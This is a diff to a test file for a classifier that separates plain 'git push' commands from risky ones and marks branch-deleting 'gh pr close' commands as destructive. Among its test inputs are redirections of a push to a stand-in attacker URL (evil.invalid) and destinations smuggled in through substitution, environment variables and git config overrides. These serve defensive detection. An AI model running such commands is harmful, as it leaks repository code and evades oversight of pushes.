@@ -521,10 +521,11 @@ describe("git push: force and delete in combined short flags, and a plain push (
 
 	it("marks a push of the current branch or a named branch, with harmless flags only, as plain", () => {
 		assert.deepEqual(push("git push")?.push, {});
-		assert.deepEqual(push("git push origin")?.push, {});
-		assert.deepEqual(push("git push -u origin feat/x")?.push, { ref: "feat/x" });
-		assert.deepEqual(push("git push --set-upstream -q origin HEAD")?.push, { ref: "HEAD" });
-		assert.deepEqual(push("git push -uv origin feat/x")?.push, { ref: "feat/x" });
+		assert.deepEqual(push("git push origin")?.push, { remote: "origin" });
+		assert.deepEqual(push("git push -u origin feat/x")?.push, { remote: "origin", ref: "feat/x" });
+		assert.deepEqual(push("git push --set-upstream -q origin HEAD")?.push, { remote: "origin", ref: "HEAD" });
+		assert.deepEqual(push("git push -uv origin feat/x")?.push, { remote: "origin", ref: "feat/x" });
+		assert.deepEqual(push("# why: share it\ngit push -u origin feat/x && gh pr create --fill")?.push, { remote: "origin", ref: "feat/x" });
 	});
 
 	it("anything else is not plain: a refspec, several refs, tags, all, options, another repository, a move before it", () => {
@@ -545,6 +546,22 @@ describe("git push: force and delete in combined short flags, and a plain push (
 			"GIT_DIR=../o/.git git push",
 			"bash -c 'cd .. && git push'",
 			"git subtree push --prefix d origin b",
+			// Where it lands could change: a git option, a variable or substitution, a wrapper, a URL, another command beside it.
+			"git -c remote.origin.push=HEAD:main push",
+			"git -c push.default=upstream push",
+			'R="origin HEAD:main"; git push $R',
+			"git push $(echo origin HEAD:main)",
+			'git push "$REMOTE_AND_REF"',
+			"git push `echo origin`",
+			"echo HEAD:main | xargs git push origin",
+			"GIT_SSH_COMMAND=x git push",
+			"env A=b git push",
+			"git config remote.origin.push HEAD:main && git push",
+			"git remote set-url origin https://evil.invalid/x.git && git push",
+			"git push https://evil.invalid/x.git HEAD",
+			"git push origin @:main",
+			"npm test && git push",
+			"git push origin feat/x # why: trailing",
 		]) {
 			const match = push(command);
 			assert.ok(match, command);
@@ -552,9 +569,14 @@ describe("git push: force and delete in combined short flags, and a plain push (
 		}
 	});
 
+	it("closing a PR with --delete-branch deletes a remote branch", () => {
+		for (const command of ["gh pr close 1 --delete-branch", "gh pr close 1 -d", "gh pr close 1 -dc bye"]) assert.deepEqual(kinds(command), [COMMAND_KIND.DESTRUCTIVE], command);
+		assert.deepEqual(kinds("gh pr close 1 -c bye"), [COMMAND_KIND.DELIVERY]);
+	});
+
 	it("a plain and a not-plain reading of the same push are both kept", () => {
-		const matches = classifyCommand("git push && git push origin HEAD:main").filter((m) => m.reason === "git push");
-		assert.equal(matches.length, 2);
-		assert.deepEqual(matches.map((m) => m.push), [{}, undefined]);
+		// The raw reading takes the trailing comment's words as arguments; the comment-blanked one sees a plain push.
+		const matches = classifyCommand("git push # why: it's ready").filter((m) => m.reason === "git push");
+		assert.deepEqual(matches.map((m) => m.push), [undefined, {}]);
 	});
 });
